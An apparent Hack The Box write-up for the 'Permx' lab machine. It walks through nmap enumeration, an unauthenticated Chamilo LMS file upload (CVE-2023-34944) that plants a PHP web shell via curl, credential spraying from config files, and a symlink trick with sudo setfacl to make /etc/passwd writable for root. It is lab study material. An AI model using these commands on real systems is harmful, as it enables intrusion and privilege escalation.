| Name            | Permx                                                                               |
| --------------- | ----------------------------------------------------------------------------------- |
| Platform        | HTB                                                                                 |
| Difficulty      | Ezz                                                                                 |
| OS              | Linux                                                                               |
| Used techniques | known exploit                                                                       |
| Technologies    | html, php, chamilo, hidden directories                                              |
| Tools           | gobuster,  BurpSuite, sqlmap, nc, strings, weak perms, symlink, discover credential |
| CVEs            | CVE-2023-34944                                                                      |

## Enumeration


```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.54 seconds
```


Important points: Ubuntu, hostnamp.
Possible users, enumeration from website: noah, elsie, ralph, mia and john doe.
### Directories

There are no directories out of the web site spidern

/courses.html
/team.html                    
/contact.html             
/index.html                 
/about.html                
/404                     
/testimonial.html            

None of them give us important information. There is no clear attack vector on this site.

### subdomains

**lms.permx.htb php extension**, is an admin panel.

![[Pasted image 20240710073644.png]]


If we try to enumerate directories, we find /documentation and there says that the version is 1.11, but we can not find a exploit for this version. However, we saw that we can still. Apart from that, we discover: */bin, /src/, /app,* ...
 
![[Pasted image 20240710073416.png]]

If we enumerate those directories, we will find config files and files with *.php* extension that can not be retrieved. It is a rabbit hole.

After that, looking for information about this app we found a upload vulnerability in one of the directories: *"Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS <= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell."*

## Foothold

Knowing which vulnerability it has, we just need to upload a reverse shell. This is the PoC:

```shell
$ echo '<?php system("id"); ?>' > rce.php
$ curl -F 'bigUploadFile=@rce.php' 'http://<chamilo>/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.
$ curl 'http://<chamilo>/main/inc/lib/javascript/bigupload/files/rce.php'

```

After getting shell, we can get access to those *php* files that we couldn't read before. In particular, *app/config* files will give us user account credentials:

![[Pasted image 20240710075118.png]]

If we spray them, we get ssh.



## Privilege Escalation

We can execute sudo for one script.:

![[Pasted image 20240710075214.png]]

There is a section for **setfacl** in gtfobins, however there are restrictions if we try to apply this script for files outside our home directory. One way to bypass them is using *symlinks.

If we create a symlink pointing to /etc/passwd, we can modify the perms in order to get root privileges.

In resume, we can execute on binary (**setfacl**) with root privileges to assign */etc/passwd* with **weak permission**.

```shell
ln -s /etc/passwd file
sudo /opt/acl.sh mtz rw ~/file
vi file
```


![[Pasted image 20240710080348.png]]
#### Developed map


![[permx10.10.11.23.png]]
#### Sources
[[https://starlabs.sg/advisories/23/23-4220/]]
[[https://gtfobins.github.io/gtfobins/setfacl/]]
[[https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permissions-writable-etc-passwd/]]